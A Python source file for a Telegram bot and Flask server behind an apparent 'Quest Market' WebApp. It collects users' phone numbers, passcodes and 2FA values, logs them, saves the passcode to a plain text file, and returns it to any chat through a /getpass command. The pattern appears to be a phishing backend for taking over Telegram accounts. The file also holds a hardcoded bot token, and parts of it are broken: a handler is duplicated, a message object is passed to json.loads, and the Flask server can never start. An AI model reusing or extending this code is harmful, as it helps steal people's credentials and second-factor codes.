import os
import telebot
from flask import Flask, Blueprint, request, jsonify
import json
from telebot import types

TOKEN = "8506299686:AAGFB5pH2-NdU4aGQXKyi2FRfX_8r0y_Kts"
WEBAPP_URL = "https://fairusss.github.io/tgbot/"

app = Flask(__name__)

path_cwd = os.path.dirname(os.path.realpath(__file__))
path_templates = os.path.join(path_cwd, "templates")
path_static = os.path.join(path_cwd, "static")

Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)

@Func.route('/func', methods=['GET', 'POST'])
def func():
    dataGet = '' if not request.get_json(force=True) else request.get_json(force=True)
    print(dataGet)
    dataReply = {'backend_data': 'some_data'}
    print(dataReply)
    return jsonify(dataReply)

@app.route('/')
def index():
    return "WebApp працює!"

@app.route('/api/data', methods=['GET', 'POST'])
def receive_data():
    data = request.get_json()
    passcode = data.get("passcode")

    if not passcode:
        return jsonify({"error": "no passcode"}), 400

    # Save passcode to temp file
    with open("temp_passcode.txt", "w") as f:
        f.write(passcode)

    print(f"[SERVER] Passcode received and saved: {passcode}")

    # Read back (just to verify)
    with open("temp_passcode.txt", "r") as f:
        saved = f.read()
        print(f"[SERVER] File contents: {saved}")

    return jsonify({"status": "ok", "saved": saved})

bot = telebot.TeleBot(TOKEN)

# /start — показує кнопку з WebApp
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton(
            text="Відкрити WebApp",
            web_app=types.WebAppInfo(url=WEBAPP_URL)
        )
    )
    bot.send_message(
        message.chat.id,
        "Привіт! Натисни, щоб відкрити Quest Market:",
        reply_markup=markup
    )

# Отримання номера телефону з WebApp
@bot.message_handler(content_types=['contact'])
def handle_webapp_data(message):
    data = message.contact.phone_number
    print(f"Received phone number: {data}")
    bot.send_message(message.chat.id, f"Отримано номер: {data}")

# Обработка данных, отправленных через WebApp (обновленный обработчик)
@bot.message_handler(content_types=['web_app_data'])
def handle_webapp_data(message):
    try:
        # Получаем данные, отправленные через setData
        data = json.loads(message.web_app_data)  # Данные передаются как строка JSON
        print(f"Received data: {data}")

        # Например, сохраняем passcode
        passcode = data.get("passcode")

        if passcode:
            with open("temp_passcode.txt", "w") as f:
                f.write(passcode)
            bot.send_message(message.chat.id, f"📄 Код: {passcode} збережено!")
        else:
            bot.send_message(message.chat.id, "❌ Код не отримано.")
    except Exception as e:
        print(f"Error processing WebApp data: {e}")
        bot.send_message(message.chat.id, "❌ Помилка при обробці даних.")

# 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
@app.route("/submit_data", methods=["POST"])
def submit_data():
    try:
        data = request.get_json()
        action = data.get("action")
        value = data.get("value")
        user_id = data.get("user_id")

        print(f"Received from WebApp: {action} = {value}")

        # Optionally send confirmation message to Telegram chat
        if user_id:
            bot.send_message(user_id, f"✅ Got {action}: {value}")

        return jsonify(success=True, message="Data received"), 200
    except Exception as e:
        print("Error:", e)
        return jsonify(success=False, message=str(e)), 400

@bot.message_handler(commands=['getpass'])
def get_pass(message):
    try:
        with open("temp_passcode.txt", "r") as f:
            saved = f.read()
        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
    except FileNotFoundError:
        bot.send_message(message.chat.id, "❌ No passcode saved yet.")

print("Бот запущено! Очікуємо дані...")

bot.infinity_polling()

if __name__ == "__main__":
    port = 12345
    app.run(host="0.0.0.0", port=port)